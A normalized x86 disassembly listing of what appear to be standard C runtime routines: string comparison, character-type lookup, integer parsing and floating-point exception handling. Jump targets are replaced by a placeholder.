jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_44610b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_43a820
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_43df2c
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_438337
pop ecx
cmp eax ebx
je r-xdata
call sub_43b260
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_4461f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_44610b
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_446232
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_446300
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_446340
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push 0x8
pop ebx
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
pop edi
leave
retn
movzx esi [ edi ]
push ebx
push esi
add edi 0x2
call sub_44cdc0
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp si 0x2d
jne r-xdata
cmp [ ebp + 0x10 ] 0x24
jg r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx esi [ edi ]
add edi 0x2
cmp [ ebp + 0x10 ] 0x10
jne r-xdata
push esi
call sub_44d0a0
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_44d0a0
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x10
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x14 ]
sub edi 0x2
test al 0x8
jne r-xdata
or [ ebp + 0x14 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x10 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_43c04c
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
call sub_44d0a0
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x14 ] 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x14 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
pop esi
pop ebx
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x4 ]
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_44651c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_446549
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_4465af
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_44651c
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_44651c
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_446672
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
leave
retn
sub_44669a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_446d96
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_446da6
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_446976
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_446de2
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_446de2
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_446de2
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_446de2
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4465af
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_446de2
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_446b5a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_43c04c
mov [ eax ] 0x22
pop ebp
retn
sub_446b87
mov edi edi
push ebp
mov ebp esp
